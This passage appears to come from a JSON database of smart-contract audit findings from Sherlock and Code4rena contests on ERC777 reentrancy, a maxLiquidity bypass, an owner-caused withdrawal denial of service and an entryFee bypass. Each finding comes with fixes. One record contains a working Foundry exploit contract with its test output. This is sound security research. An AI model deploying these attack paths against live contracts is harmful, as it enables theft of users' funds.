+            "title": "Reentrancy"
+          }
+        },
+        {
+          "tags_tag": {
+            "title": "ERC777"
+          }
+        }
+      ]
+    },
+    {
+      "id": "3628",
+      "kind": "GIT",
+      "auditfirm_id": "3",
+      "impact": "MEDIUM",
+      "finders_count": 1,
+      "protocol_id": "100",
+      "title": "M-2: When tokenX is an ERC777 token, users can bypass maxLiquidity",
+      "content": "Source: https://github.com/sherlock-audit/2022-11-buffer-judging/issues/112 \n\n## Found by \ncccz\n\n## Summary\nWhen tokenX is an ERC777 token, users can use callbacks to provide liquidity exceeding maxLiquidity\n## Vulnerability Detail\nIn BufferBinaryPool._provide, when tokenX is an ERC777 token, the tokensToSend function of account will be called in tokenX.transferFrom before sending tokens. When the user calls provide again in tokensToSend, since BufferBinaryPool has not received tokens at this time, totalTokenXBalance() has not increased, and the following checks can be bypassed, so that users can provide liquidity exceeding maxLiquidity.\n```solidity\n         require(\n             balance + tokenXAmount <= maxLiquidity,\n             \"Pool has already reached it's max limit\"\n         );\n```\n## Impact\nusers can provide liquidity exceeding maxLiquidity.\n\n## Code Snippet\nhttps://github.com/sherlock-audit/2022-11-buffer/blob/main/contracts/contracts/core/BufferBinaryPool.sol#L216-L240\n## Tool used\n\nManual Review\n\n## Recommendation\nChange to\n```diff\n    function _provide(\n        uint256 tokenXAmount,\n        uint256 minMint,\n        address account\n    ) internal returns (uint256 mint) {\n+        bool success = tokenX.transferFrom(\n+            account,\n+            address(this),\n+            tokenXAmount\n+        );\n        uint256 supply = totalSupply();\n        uint256 balance = totalTokenXBalance();\n\n        require(\n            balance + tokenXAmount <= maxLiquidity,\n            \"Pool has already reached it's max limit\"\n        );\n\n        if (supply > 0 && balance > 0)\n            mint = (tokenXAmount * supply) / (balance);\n        else mint = tokenXAmount * INITIAL_RATE;\n\n        require(mint >= minMint, \"Pool: Mint limit is too large\");\n        require(mint > 0, \"Pool: Amount is too small\");\n\n-        bool success = tokenX.transferFrom(\n-            account,\n-            address(this),\n-            tokenXAmount\n-        );\n```\n\n## Discussion\n\n**0x00052**\n\nNeither tokenX (USDC or BFR) are ERC777, so not applicable to current contracts. Something to consider if the team plans to add and ERC777",
+      "summary": "\nThis bug report is about an issue found in the BufferBinaryPool._provide function when tokenX is an ERC777 token. It was found by cccz and the vulnerability detail is that when the user calls provide again in tokensToSend, since BufferBinaryPool has not received tokens at this time, totalTokenXBalance() has not increased, and the checks can be bypassed, so that users can provide liquidity exceeding maxLiquidity. The impact of this is that users can provide liquidity exceeding maxLiquidity. The tool used was Manual Review and the recommendation is to change the code snippet to the one provided. Lastly, it was discussed that neither tokenX (USDC or BFR) are ERC777, so not applicable to current contracts.",
+      "report_date": {},
+      "contest_prize_txt": "21800 USDC",
+      "contest_link": "https://app.sherlock.xyz/audits/contests/24",
+      "sponsor_name": "Buffer Finance",
+      "sponsor_link": "",
+      "quality_score": 3,
+      "general_score": 5,
+      "source_link": "",
+      "github_link": "https://github.com/sherlock-audit/2022-11-buffer-judging/issues/112",
+      "pdf_link": "",
+      "pdf_page_from": 0,
+      "contest_id": "24",
+      "slug": "m-2-when-tokenx-is-an-erc777-token-users-can-bypass-maxliquidity-sherlock-buffer-finance-buffer-finance-git",
+      "firm_name": "Sherlock",
+      "firm_logo_square": "sherlock_square.png",
+      "protocol_name": "Buffer Finance",
+      "bookmarked": false,
+      "read": false,
+      "auditfirms_auditfirm": {
+        "name": "Sherlock",
+        "logo_square": "sherlock_square.png"
+      },
+      "protocols_protocol": {
+        "name": "Buffer Finance",
+        "protocols_protocolcategoryscore": [
+          {
+            "protocols_protocolcategory": {
+              "title": "Dexes"
+            },
+            "score": 0.5
+          },
+          {
+            "protocols_protocolcategory": {
+              "title": "Yield"
+            },
+            "score": 0.5
+          },
+          {
+            "protocols_protocolcategory": {
+              "title": "Services"
+            },
+            "score": 0.5
+          },
+          {
+            "protocols_protocolcategory": {
+              "title": "Yield Aggregator"
+            },
+            "score": 0.5
+          },
+          {
+            "protocols_protocolcategory": {
+              "title": "Options Vault"
+            },
+            "score": 0.5
+          }
+        ]
+      },
+      "issues_issuetagscore": [
+        {
+          "tags_tag": {
+            "title": "CEI"
+          }
+        },
+        {
+          "tags_tag": {
+            "title": "Reentrancy"
+          }
+        },
+        {
+          "tags_tag": {
+            "title": "ERC777"
+          }
+        }
+      ]
+    },
+    {
+      "id": "3627",
+      "kind": "GIT",
+      "auditfirm_id": "3",
+      "impact": "MEDIUM",
+      "finders_count": 3,
+      "protocol_id": "100",
+      "title": "M-1: resolveQueuedTrades() ERC777 re-enter to steal funds",
+      "content": "Source: https://github.com/sherlock-audit/2022-11-buffer-judging/issues/130 \n\n## Found by \nbin2chen, HonorLt, KingNFT\n\n## Summary\n_openQueuedTrade() does not follow the “Checks Effects Interactions” principle and may lead to re-entry to steal the funds\n\nhttps://fravoll.github.io/solidity-patterns/checks_effects_interactions.html\n\n## Vulnerability Detail\nThe prerequisite is that tokenX is ERC777 e.g. “sushi”\n1. resolveQueuedTrades() call _openQueuedTrade()\n2. in _openQueuedTrade() call \"tokenX.transfer(queuedTrade.user)\" if (revisedFee < queuedTrade.totalFee) before set queuedTrade.isQueued = false; \n```solidity\n    function _openQueuedTrade(uint256 queueId, uint256 price) internal {\n...\n        if (revisedFee < queuedTrade.totalFee) {\n            tokenX.transfer( //***@audit call transfer , if ERC777 , can re-enter ***/\n                queuedTrade.user,\n                queuedTrade.totalFee - revisedFee\n            );\n        }\n\n        queuedTrade.isQueued = false;  //****@audit  change state****/\n    }\n```\n3.if ERC777 re-enter to #cancelQueuedTrade() to get tokenX back,it can close,  because queuedTrade.isQueued still equal true\n4. back to _openQueuedTrade()  set queuedTrade.isQueued = false\n5.so steal tokenX\n## Impact\nif tokenX equal ERC777 can steal token\n## Code Snippet\nhttps://github.com/sherlock-audit/2022-11-buffer/blob/main/contracts/contracts/core/BufferRouter.sol#L350\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nfollow “Checks Effects Interactions” \n\n```solidity\n    function _openQueuedTrade(uint256 queueId, uint256 price) internal {\n...\n+      queuedTrade.isQueued = false; \n        // Transfer the fee to the target options contract\n        IERC20 tokenX = IERC20(optionsContract.tokenX());\n        tokenX.transfer(queuedTrade.targetContract, revisedFee);\n\n-       queuedTrade.isQueued = false; \n        emit OpenTrade(queuedTrade.user, queueId, optionId);\n    }\n```",
+      "summary": "\nThis bug report concerns a vulnerability in the _openQueuedTrade() function of the BufferRouter.sol smart contract. It was found by bin2chen, HonorLt, and KingNFT and is related to the “Checks Effects Interactions” principle. If a tokenX is an ERC777 token, a malicious user could re-enter the cancelQueuedTrade() function to get the token back, as the queuedTrade.isQueued variable would still be true. This could result in the malicious user stealing tokenX.\n\nThe code snippet provided in the report shows the original code and the recommended code changes. The original code calls tokenX.transfer() before setting queuedTrade.isQueued to false. In the recommended code, queuedTrade.isQueued is set to false before the tokenX transfer.\n\nThe impact of this vulnerability is that if tokenX is an ERC777 token, a malicious user could steal it. The tool used to detect this vulnerability was manual review. The recommendation is to follow the “Checks Effects Interactions” principle when writing code.",
+      "report_date": {},
+      "contest_prize_txt": "21800 USDC",
+      "contest_link": "https://app.sherlock.xyz/audits/contests/24",
+      "sponsor_name": "Buffer Finance",
+      "sponsor_link": "",
+      "quality_score": 5,
+      "general_score": 5,
+      "source_link": "",
+      "github_link": "https://github.com/sherlock-audit/2022-11-buffer-judging/issues/130",
+      "pdf_link": "",
+      "pdf_page_from": 0,
+      "contest_id": "24",
+      "slug": "m-1-resolvequeuedtrades-erc777-re-enter-to-steal-funds-sherlock-buffer-finance-buffer-finance-git",
+      "firm_name": "Sherlock",
+      "firm_logo_square": "sherlock_square.png",
+      "protocol_name": "Buffer Finance",
+      "bookmarked": false,
+      "read": false,
+      "auditfirms_auditfirm": {
+        "name": "Sherlock",
+        "logo_square": "sherlock_square.png"
+      },
+      "protocols_protocol": {
+        "name": "Buffer Finance",
+        "protocols_protocolcategoryscore": [
+          {
+            "protocols_protocolcategory": {
+              "title": "Dexes"
+            },
+            "score": 0.5
+          },
+          {
+            "protocols_protocolcategory": {
+              "title": "Yield"
+            },
+            "score": 0.5
+          },
+          {
+            "protocols_protocolcategory": {
+              "title": "Services"
+            },
+            "score": 0.5
+          },
+          {
+            "protocols_protocolcategory": {
+              "title": "Yield Aggregator"
+            },
+            "score": 0.5
+          },
+          {
+            "protocols_protocolcategory": {
+              "title": "Options Vault"
+            },
+            "score": 0.5
+          }
+        ]
+      },
+      "issues_issuetagscore": [
+        {
+          "tags_tag": {
+            "title": "Reentrancy"
+          }
+        },
+        {
+          "tags_tag": {
+            "title": "ERC777"
+          }
+        },
+        {
+          "tags_tag": {
+            "title": "CEI"
+          }
+        }
+      ]
+    },
+    {
+      "id": "5825",
+      "kind": "GIT",
+      "auditfirm_id": "2",
+      "impact": "MEDIUM",
+      "finders_count": 1,
+      "protocol_id": "116",
+      "title": "[M-04] Auction created by ERC777 Tokens with tax can be stolen by re-entrancy attack",
+      "content": "\nThe createAuction function lacks the check of re-entrancy. An attacker can use an ERC777 token with tax as the base token to create auctions. By registering ERC777TokensSender interface implementer in the ERC1820Registry contract, the attacker can re-enter the createAuction function and create more than one auction with less token. And the sum of the totalBaseAmount of these auctions will be greater than the token amount received by the SizeSealed contract. Finally, the attacker can take more money from the contract global pool which means stealing tokens from the other auctions and treasury.\n\n### Proof of Concept\n\nForge test\n\n    // SPDX-License-Identifier: GPL-3.0\n    pragma solidity 0.8.17;\n\n    import {Test} from \"forge-std/Test.sol\";\n\n    import {SizeSealedTest} from \"./SizeSealed.t.sol\";\n    import {ERC777} from \"openzeppelin-contracts/contracts/token/ERC777/ERC777.sol\";\n    import \"openzeppelin-contracts/contracts/utils/introspection/IERC1820Registry.sol\";\n    import {MockSeller} from \"./mocks/MockSeller.sol\";\n    import {MockERC20} from \"./mocks/MockERC20.sol\";\n\n    contract TaxERC777 is ERC777{\n        uint32 tax = 50; // 50% tax rate\n\n        constructor(string memory name_,\n            string memory symbol_,\n            address[] memory defaultOperators_) ERC777(name_, symbol_, defaultOperators_){}\n        \n        function mint(address rec, uint256 amount) external{\n            super._mint(rec, amount, \"\", \"\", false);\n        }\n\n        function _beforeTokenTransfer(\n            address operator,\n            address from,\n            address to,\n            uint256 amount\n        ) internal override {\n            if(to == address(0)||from==address(0)){ return;}\n            // tax just burn for test\n            \n        }\n\n        function _send(\n            address from,\n            address to,\n            uint256 amount,\n            bytes memory userData,\n            bytes memory operatorData,\n            bool requireReceptionAck\n        ) internal override {\n            uint tax_amount = amount* tax / 100;\n            _burn(from, tax_amount, \"\", \"\");\n            super._send(from, to, amount-tax_amount, userData, operatorData, requireReceptionAck);\n        }\n\n    }\n\n    contract Callback {\n        MockSeller seller;\n        uint128 baseToSell;\n\n        uint256 reserveQuotePerBase = 0.5e6 * uint256(type(uint128).max) / 1e18;\n        uint128 minimumBidQuote = 1e6;\n        // Auction parameters (cliff unlock)\n        uint32 startTime;\n        uint32 endTime;\n        uint32 unlockTime;\n        uint32 unlockEnd;\n        uint128 cliffPercent;\n\n        uint8 entry = 0;\n        uint128 amount_cut_tax;\n        constructor(MockSeller _seller, uint128 _baseToSell, uint256 _reserveQuotePerBase, uint128 _minimumBidQuote, uint32 _startTime, uint32 _endTime, uint32 _unlockTime, uint32 _unlockEnd, uint128 _cliffPercent){\n            seller = _seller;\n            baseToSell = _baseToSell;\n            reserveQuotePerBase = _reserveQuotePerBase;\n            minimumBidQuote = _minimumBidQuote;\n            startTime = _startTime;\n            endTime = _endTime;\n            unlockTime = _unlockTime;\n            unlockEnd = _unlockEnd;\n            cliffPercent = _cliffPercent;\n        }\n        function tokensToSend(address operator, address from, address to, uint256 amount, bytes calldata userData, bytes calldata operatorData) external{\n            if(from==address(0) || to==address(0)){return;}\n            if(entry == 0){\n                entry += 1;\n                amount_cut_tax = baseToSell / 2;\n                seller.createAuction(\n                    amount_cut_tax, reserveQuotePerBase, minimumBidQuote, startTime, endTime, unlockTime, unlockEnd, cliffPercent\n                );\n                return;\n            }\n            else if(entry == 1){\n                entry += 1;\n                ERC777(msg.sender).transferFrom(from, to, amount_cut_tax);\n                return;\n            }\n            entry += 1;\n            return;\n            \n        }\n        function canImplementInterfaceForAddress(bytes32 interfaceHash, address addr) external view returns(bytes32){return keccak256(abi.encodePacked(\"ERC1820_ACCEPT_MAGIC\"));}\n    }\n\n    contract MyTest is SizeSealedTest {\n        \n        IERC1820Registry internal constant _ERC1820_REGISTRY = IERC1820Registry(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24);\n        function testCreateAuctionFromErc777() public {\n            TaxERC777 tax777Token;\n            address[] memory addrme = new address[](1);\n            addrme[0] = address(this);\n            tax777Token = new TaxERC777(\"t7\", \"t7\", addrme);\n            \n            seller = new MockSeller(address(auction), quoteToken, MockERC20(address(tax777Token)));\n            Callback callbackImpl = new Callback(seller, baseToSell, reserveQuotePerBase, minimumBidQuote, startTime, endTime, unlockTime, unlockEnd, cliffPercent);\n\n            // just without adding more function to MockSeller\n            vm.startPrank(address(seller));\n            _ERC1820_REGISTRY.setInterfaceImplementer(address(seller), keccak256(\"ERC777TokensSender\"), address(callbackImpl));\n            tax777Token.approve(address(callbackImpl), type(uint256).max);\n            vm.stopPrank();\n            seller.createAuction(\n                baseToSell, reserveQuotePerBase, minimumBidQuote, startTime, endTime, unlockTime, unlockEnd, cliffPercent\n            );\n            uint auction_balance = tax777Token.balanceOf(address(auction));\n            uint128 auction1_amount = get_auction_base_amount(1);\n            uint128 auction2_amount = get_auction_base_amount(2);\n            emit log_named_uint(\"auction balance\", auction_balance);\n            emit log_named_uint(\"auction 1 totalBaseAmount\", auction1_amount);\n            emit log_named_uint(\"auction 2 totalBaseAmount\", auction2_amount);\n            assertGt(auction1_amount+auction2_amount, auction_balance);\n        }\n\n        function get_auction_base_amount(uint id) private returns (uint128){\n            (, ,AuctionParameters memory para) = auction.idToAuction(id);\n            return para.totalBaseAmount;\n        }\n    }\n\nYou should fork mainnet because the test needs to call the ERC1820Registry contract at `0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24`\n\n    forge test --match-test testCreateAuctionFromErc777 -vvvvv --fork-url XXXXXXXX\n\nTest passed and print logs:\n\n    ...\n    ...\n        â”œâ”€ [4900] SizeSealed::idToAuction(1) [staticcall]\n        â”‚   â””â”€ â† (1657269193, 1657269253, 1657269293, 1657270193, 0), (0xbfFb01bB2DDb4EfA87cB78EeCB8115AFAe6d2032, 0, 340282366920938463463374607431768211455, 0), (0x3A1148FE01e3c4721D93fe8A36c2b5C29109B6ae, 0xCe71065D4017F316EC606Fe4422e11eB2c47c246, 170141183460469231731687303, 10000000000000000000, 1000000, 0x0000000000000000000000000000000000000000000000000000000000000000, (9128267825790407824510503980134927506541852140766882823704734293547670668960, 16146712025506556794526643103432719420453319699545331060391615514163464043902))\n        â”œâ”€ [4900] SizeSealed::idToAuction(2) [staticcall]\n        â”‚   â””â”€ â† (1657269193, 1657269253, 1657269293, 1657270193, 0), (0xbfFb01bB2DDb4EfA87cB78EeCB8115AFAe6d2032, 0, 340282366920938463463374607431768211455, 0), (0x3A1148FE01e3c4721D93fe8A36c2b5C29109B6ae, 0xCe71065D4017F316EC606Fe4422e11eB2c47c246, 170141183460469231731687303, 5000000000000000000, 1000000, 0x0000000000000000000000000000000000000000000000000000000000000000, (9128267825790407824510503980134927506541852140766882823704734293547670668960, 16146712025506556794526643103432719420453319699545331060391615514163464043902))\n        â”œâ”€ emit log_named_uint(key: auction balance, val: 10000000000000000000)\n        â”œâ”€ emit log_named_uint(key: auction 1 totalBaseAmount, val: 10000000000000000000)\n        â”œâ”€ emit log_named_uint(key: auction 2 totalBaseAmount, val: 5000000000000000000)\n        â””â”€ â† ()\n\n    Test result: ok. 1 passed; 0 failed; finished in 7.64s\n\n### Tools Used\n\nfoundry\n\n### Recommended Mitigation Steps\n\ncheck re-entrancy\n\n**[Trust (warden) commented](https://github.com/code-423n4/2022-11-size-findings/issues/192#issuecomment-1308007344):**\n > Very clever, but requires such ERC777 token to exist, interoperate with ERC1820 registry and be deposited by other sellers. Does such token exist?\n\n**[RagePit (SIZE) confirmed](https://github.com/code-423n4/2022-11-size-findings/issues/192#issuecomment-1322409870)**\n\n**[ronnyx2017 (warden) commented](https://github.com/code-423n4/2022-11-size-findings/issues/192#issuecomment-1332282361):**\n > > Very clever, but requires such ERC777 token to exist, interoperate with ERC1820 registry and be deposited by other sellers. Does such token exist?\n> \n> Hi, thanks, just for explaining in more detail about the exploit. As it says in https://eips.ethereum.org/EIPS/eip-777, \"The token contract MUST register the ERC777Token interface with its own address via [ERC-1820](https://eips.ethereum.org/EIPS/eip-1820).\". The interface of interoperating with ERC1820 registry is built into ERC777 by default. And what the attacker need to do is registering in the ERC1820 registry for his sender/receriver address.\n\n***\n\n",
+      "summary": "\nThis bug report is about a vulnerability in the createAuction function of the SizeSealed contract. The vulnerability allows an attacker to use an ERC777 token with tax as the base token to create auctions. By registering ERC777TokensSender interface implementer in the ERC1820Registry contract, the attacker can re-enter the createAuction function and create more than one auction with less token. The sum of the totalBaseAmount of these auctions will be greater than the token amount received by the SizeSealed contract, allowing the attacker to take more money from the contract global pool.\n\nTo test this vulnerability, the foundry tool was used. The test passed and the result was ok, with 1 passed and 0 failed.\n\nTo mitigate this vulnerability, it is recommended to check for re-entrancy. This can be done by implementing a re-entrancy guard in the createAuction function.",
+      "report_date": {},
+      "contest_prize_txt": "$42,500 USDC",
+      "contest_link": "https://code4rena.com/contests/2022-11-size-contest",
+      "sponsor_name": "SIZE",
+      "sponsor_link": "https://twitter.com/sizemarkets",
+      "quality_score": 5,
+      "general_score": 5,
+      "source_link": "https://code4rena.com/reports/2022-11-size",
+      "github_link": "https://github.com/code-423n4/2022-11-size-findings/issues/192",
+      "pdf_link": "",
+      "pdf_page_from": 0,
+      "contest_id": "180",
+      "slug": "m-04-auction-created-by-erc777-tokens-with-tax-can-be-stolen-by-re-entrancy-attack-code4rena-size-size-contest-git",
+      "firm_name": "Code4rena",
+      "firm_logo_square": "code4rena_square.png",
+      "protocol_name": "SIZE",
+      "bookmarked": false,
+      "read": false,
+      "auditfirms_auditfirm": {
+        "name": "Code4rena",
+        "logo_square": "code4rena_square.png"
+      },
+      "protocols_protocol": {
+        "name": "SIZE",
+        "protocols_protocolcategoryscore": [
+          {
+            "protocols_protocolcategory": {
+              "title": "Services"
+            },
+            "score": 0.5
+          },
+          {
+            "protocols_protocolcategory": {
+              "title": "Yield Aggregator"
+            },
+            "score": 0.5
+          },
+          {
+            "protocols_protocolcategory": {
+              "title": "Staking Pool"
+            },
+            "score": 0.5
+          }
+        ]
+      },
+      "issues_issuetagscore": [
+        {
+          "tags_tag": {
+            "title": "Reentrancy"
+          }
+        },
+        {
+          "tags_tag": {
+            "title": "ERC777"
+          }
+        }
+      ]
+    },
+    {
+      "id": "2939",
+      "kind": "GIT",
+      "auditfirm_id": "2",
+      "impact": "MEDIUM",
+      "finders_count": 2,
+      "protocol_id": "193",
+      "title": "[M-06] [Denial-of-Service] Contract Owner Could Block Users From Withdrawing Their Strike",
+      "content": "_Submitted by xiaoming90, also found by berndartmueller_\n\nWhen users withdraw their strike escrowed in Putty contract, Putty will charge a certain amount of fee from the strike amount. The fee will first be sent to the contract owner, and the remaining strike amount will then be sent to the users.\n\n<https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L500>\n\n```solidity\nfunction withdraw(Order memory order) public {\n\t..SNIP..\n\n\t// transfer strike to owner if put is expired or call is exercised\n\tif ((order.isCall && isExercised) || (!order.isCall && !isExercised)) {\n\t\t// send the fee to the admin/DAO if fee is greater than 0%\n\t\tuint256 feeAmount = 0;\n\t\tif (fee > 0) {\n\t\t\tfeeAmount = (order.strike * fee) / 1000;\n\t\t\tERC20(order.baseAsset).safeTransfer(owner(), feeAmount);\n\t\t}\n\n\t\tERC20(order.baseAsset).safeTransfer(msg.sender, order.strike - feeAmount);\n\n\t\treturn;\n\t}\n\t..SNIP..\n}\n```\n\nThere are two methods on how the owner can deny user from withdrawing their strike amount from the contract\n\n#### Method #1 - Set the `owner()` to `zero` address\n\nMany of the token implementations do not allow transfer to `zero` address ([Reference](https://github.com/d-xo/weird-erc20#revert-on-transfer-to-the-zero-address)). Popular ERC20 implementations such as the following Openzeppelin's ERC20 implementation do not allow transfer to `zero` address, and will revert immediately if the `to` address (recipient) points to a `zero` address during a transfer.\n\n<https://github.com/OpenZeppelin/openzeppelin-contracts/blob/5fbf494511fd522b931f7f92e2df87d671ea8b0b/contracts/token/ERC20/ERC20.sol#L226>\n\n```solidity\nfunction _transfer(\n    address from,\n    address to,\n    uint256 amount\n) internal virtual {\n    require(from != address(0), \"ERC20: transfer from the zero address\");\n    require(to != address(0), \"ERC20: transfer to the zero address\");\n\n    _beforeTokenTransfer(from, to, amount);\n\n    uint256 fromBalance = _balances[from];\n    require(fromBalance >= amount, \"ERC20: transfer amount exceeds balance\");\n    unchecked {\n        _balances[from] = fromBalance - amount;\n        // Overflow not possible: the sum of all balances is capped by totalSupply, and the sum is preserved by\n        // decrementing then incrementing.\n        _balances[to] += amount;\n    }\n\n    emit Transfer(from, to, amount);\n\n    _afterTokenTransfer(from, to, amount);\n}\n```\n\nIt is possible for the owner to transfer the ownership to a `zero` address, thus causing the fee transfer to the contract owner to always revert. When the fee transfer always reverts, no one can withdraw their strike amount from the contract.\n\nThis issue will affect all orders that adopt a `baseAsset` that reverts when transferring to `zero` address.\n\n#### Method #2 - If `baseAsset` is a ERC777 token\n\n> Note: `owner()` could point to a contract or EOA account. By pointing to a contract, the contract could implement logic to revert whenever someone send tokens to it.\n\nERC777 contains a `tokensReceived` hook that will notify the recipient whenever someone sends some tokens to the recipient .\n\nAssuming that the `baseAsset` is a ERC77 token, the recipient, which is the `owner()` in this case, could always revert whenever `PuttyV2` contract attempts to send the fee to recipient. This will cause the `withdraw` function to revert too. As a result, no one can withdraw their strike amount from the contract.\n\nThis issue will affect all orders that has ERC777 token as its `baseAsset`.\n\n### Impact\n\nUser cannot withdraw their strike amount and their asset will be stuck in the contract.\n\n### Recommended Mitigation Steps\n\nIt is recommended to adopt a [withdrawal pattern](https://docs.soliditylang.org/en/v0.8.15/common-patterns.html#withdrawal-from-contracts) for retrieving owner fee.\n\nInstead of transferring the fee directly to owner address during withdrawal, save the amount of fee that the owner is entitled to in a state variable. Then, implement a new function that allows the owner to withdraw the fee from the `PuttyV2` contract.\n\nConsider the following implementation. In the following example, there is no way for the owner to perform denial-of-user because the outcome of the fee transfer (succeed or fail) to the owner will not affect the user's strike withdrawal process.\n\nThis will give users more assurance and confidence about the security of their funds stored within Putty.\n\n```solidity\nmapping(address => uint256) public ownerFees;\n\nfunction withdraw(Order memory order) public {\n\t..SNIP..\n    // transfer strike to owner if put is expired or call is exercised\n    if ((order.isCall && isExercised) || (!order.isCall && !isExercised)) {\n        // send the fee to the admin/DAO if fee is greater than 0%\n        uint256 feeAmount = 0;\n        if (fee > 0) {\n            feeAmount = (order.strike * fee) / 1000;\n            ownerFees[order.baseAsset] += feeAmount\n        }\n\n        ERC20(order.baseAsset).safeTransfer(msg.sender, order.strike - feeAmount);\n\n        return;\n    }\n    ..SNIP..\n}\n\nfunction withdrawFee(address baseAsset) public onlyOwner {\n\tuint256 _feeAmount = ownerFees[baseAsset];\n\townerFees[baseAsset] = 0;\n\tERC20(baseAsset).safeTransfer(owner(), _feeAmount);\n}\n```\n**[outdoteth (Putty Finance) disagreed with severity](https://github.com/code-423n4/2022-06-putty-findings/issues/296#issuecomment-1177678807)**\n\n**[HickupHH3 (judge) commented](https://github.com/code-423n4/2022-06-putty-findings/issues/296#issuecomment-1179936225):**\n > The scenarios provided are valid, especially for baseAssets that revert on zero-address transfer.\n> \n> While the likelihood is low, assets are lost and cannot be retrieved.<br>\n> `3 — High: Assets can be stolen/lost/compromised directly (or indirectly if there is a valid attack path that does not have hand-wavy hypotheticals).`\n\n**[HickupHH3 (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2022-06-putty-findings/issues/296#issuecomment-1181754248):**\n > Thinking about it further, the external conditions / requirements needed for the DoS to happen are somewhat strong.\n> - the ERC777 attack requires `owner()` or the token to be engineered to be malicious and adopted.\n> - DoS via revoking ownership requires `fee` to be non-zero first, which is unlikely to happen. I can classify this as a \"user-prone\" bug, which would be similar to cases like including ETH when WETH is intended to be used (#226).\n> \n> Hence, I think medium severity is more appropriate:\n> `2 — Med: Assets not at direct risk, but the function of the protocol or its availability could be impacted, or leak value with a hypothetical attack path with stated assumptions, but external requirements.`\n\n**[outdoteth (Putty Finance) confirmed and resolved](https://github.com/code-423n4/2022-06-putty-findings/issues/296#issuecomment-1185411399):**\n > PR with fix: https://github.com/outdoteth/putty-v2/pull/4.\n\n**hyh (warden) reviewed mitigation:**\n > The same fix as in [H-01](https://github.com/code-423n4/2022-06-putty-findings/issues/269): as the platform fee is now transferred on order filling, any owner griefing can only yield a denial of service. There will be no loss of funds as this way position is only about to be created when the fee is transferred.\n\n***\n\n",
+      "summary": "\nThis bug report is concerning the PuttyV2 contract, which is a smart contract used to facilitate the trading of options. When users withdraw their strike escrowed in the Putty contract, Putty will charge a certain amount of fee from the strike amount. The fee will first be sent to the contract owner, and the remaining strike amount will then be sent to the users. \n\nThe bug is that, there are two methods on how the owner can deny user from withdrawing their strike amount from the contract. The first method is to set the owner() to zero address. This is because many of the token implementations do not allow transfer to zero address, and will revert immediately if the to address (recipient) points to a zero address during a transfer. The second method is if the baseAsset is a ERC777 token. This is because ERC777 contains a tokensReceived hook that will notify the recipient whenever someone sends some tokens to the recipient. The recipient, which is the owner() in this case, could always revert whenever PuttyV2 contract attempts to send the fee to recipient. This will cause the withdraw function to revert too.\n\nThe impact of this bug is that users cannot withdraw their strike amount and their asset will be stuck in the contract.\n\nThe recommended mitigation steps to fix this bug is to adopt a withdrawal pattern for retrieving owner fee. Instead of transferring the fee directly to owner address during withdrawal, save the amount of fee that the owner is entitled to in a state variable. Then, implement a new function that allows the owner to withdraw the fee from the PuttyV2 contract. This will give users more assurance and confidence about the security of their funds stored within Putty.",
+      "report_date": {},
+      "contest_prize_txt": "$50,000 USDC",
+      "contest_link": "https://code4rena.com/contests/2022-06-putty-contest",
+      "sponsor_name": "Putty",
+      "sponsor_link": "https://twitter.com/puttyfi",
+      "quality_score": 4.6,
+      "general_score": 4.444444444444445,
+      "source_link": "https://code4rena.com/reports/2022-06-putty",
+      "github_link": "https://github.com/code-423n4/2022-06-putty-findings/issues/296",
+      "pdf_link": "",
+      "pdf_page_from": 0,
+      "contest_id": "142",
+      "slug": "m-06-denial-of-service-contract-owner-could-block-users-from-withdrawing-their-strike-code4rena-putty-putty-contest-git",
+      "firm_name": "Code4rena",
+      "firm_logo_square": "code4rena_square.png",
+      "protocol_name": "Putty",
+      "bookmarked": false,
+      "read": false,
+      "auditfirms_auditfirm": {
+        "name": "Code4rena",
+        "logo_square": "code4rena_square.png"
+      },
+      "protocols_protocol": {
+        "name": "Putty",
+        "protocols_protocolcategoryscore": [
+          {
+            "protocols_protocolcategory": {
+              "title": "Dexes"
+            },
+            "score": 0.5
+          },
+          {
+            "protocols_protocolcategory": {
+              "title": "Synthetics"
+            },
+            "score": 0.5
+          },
+          {
+            "protocols_protocolcategory": {
+              "title": "Leveraged Farming"
+            },
+            "score": 0.5
+          },
+          {
+            "protocols_protocolcategory": {
+              "title": "Payments"
+            },
+            "score": 0.5
+          },
+          {
+            "protocols_protocolcategory": {
+              "title": "Options Vault"
+            },
+            "score": 0.5
+          }
+        ]
+      },
+      "issues_issuetagscore": [
+        {
+          "tags_tag": {
+            "title": "DOS"
+          }
+        },
+        {
+          "tags_tag": {
+            "title": "Withdraw Pattern"
+          }
+        },
+        {
+          "tags_tag": {
+            "title": "ERC777"
+          }
+        },
+        {
+          "tags_tag": {
+            "title": "ERC20"
+          }
+        }
+      ]
+    },
+    {
+      "id": "2660",
+      "kind": "GIT",
+      "auditfirm_id": "2",
+      "impact": "MEDIUM",
+      "finders_count": 1,
+      "protocol_id": "206",
+      "title": "[M-01] User can bypass `entryFee` by sending arbitrary `calldata` to ParaSwap operator",
+      "content": "_Submitted by 0xDjango_\n\n[NestedFactory.sol#L466](https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/NestedFactory.sol#L466)<br>\n[ParaswapOperator.sol#L34](https://github.com/code-423n4/2022-06-nested/blob/b4a153c943d54755711a2f7b80cbbf3a5bb49d76/contracts/operators/Paraswap/ParaswapOperator.sol#L34)<br>\n\nAny user is able to bypass the `entryFee` collection when using `NestedFactory.create()` by passing in arbitrary calldata when using the ParaSwap router. High level, a user can pass in calldata to swap from a miniscule amount of input token to an ERC777 with themselves as the recipient and will gain control of execution, at which time they can send a large amount of output token back to the Nested Factory.\n\nIf the user sends `1 wei` of input token, the Nested Factory will return an `entryFee` of `0` due to precision loss. The amount of output token returned to the contract via the direct transfer from the user will then be deposited in the vault.\n\n### Proof of Concept\n\n**Steps**\n\n*   User calls `NestedFactory.create()` with a single input order. This input order will define the parameters of the call to Paraswap.\n*   The single order defines the following in pseudocode:\n    1.  inputToken: Any token, but we'll use address(0) ETH\n    2.  amount: 1 wei\n    3.  Order(operator=Paraswap, token=USDC, calldata=calldata)\n\n***The calldata used in the call to paraswap would swap from ETH to any ERC777 (NOT USDC), with an attack contract address set as the `beneficiary`. Upon transferring the swapped ERC777 to the user's attack contract, the contract would immediately send e.g. 1,000,000 USDC directly back to the Nested Factory contract.***\n\n*   The Paraswap operator checks the balances of the buy and sell tokens. Note that the buy token is defined in the Order token parameter, not the calldata 